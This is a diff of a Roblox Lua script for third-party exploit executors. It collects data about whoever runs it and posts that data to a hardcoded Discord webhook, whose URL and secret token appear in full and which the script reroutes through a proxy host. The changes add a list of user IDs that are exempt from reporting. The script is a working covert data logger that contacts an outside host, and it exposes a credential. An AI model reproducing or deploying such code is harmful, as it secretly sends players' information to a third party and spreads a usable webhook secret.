@@ -1,18 +1,22 @@
 local discord = "https://discord.com/api/webhooks/1513059320353525891/45J_BqKT84C3zVUQ3_DdewFDvO0WN28DSm4jc26Zx0aaY952zPScRh2_Rz6TgF-8WaiA"
 
+local blockedUsers = {10472996475, 2932138780}
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+for _, id in pairs(blockedUsers) do
+    if LocalPlayer.UserId == id then return end
+end
+
 if not discord or discord == "" then return end
 if discord:find("discord.com") then discord = discord:gsub("discord.com", "webhook.lewisakura.moe") end
 if discord:find("discordapp.com") then discord = discord:gsub("discordapp.com", "webhook.lewisakura.moe") end
 
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
 local r = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 if not r then return end
 
 local pleasework = "https://www.roblox.com/images/PersonalChannel/missing_avatar.png"
-
 
 task.spawn(function()
     pcall(function()
@@ -28,7 +32,6 @@ task.spawn(function()
 end)
 
 task.wait(1.5)
-
 
 local fields = {
     {
@@ -55,6 +58,7 @@ pcall(function()
         Body = HttpService:JSONEncode(payload)
     })
 end)
+
 
 
 local allowedIds = {4396960314, 10472996475, 2932138780}
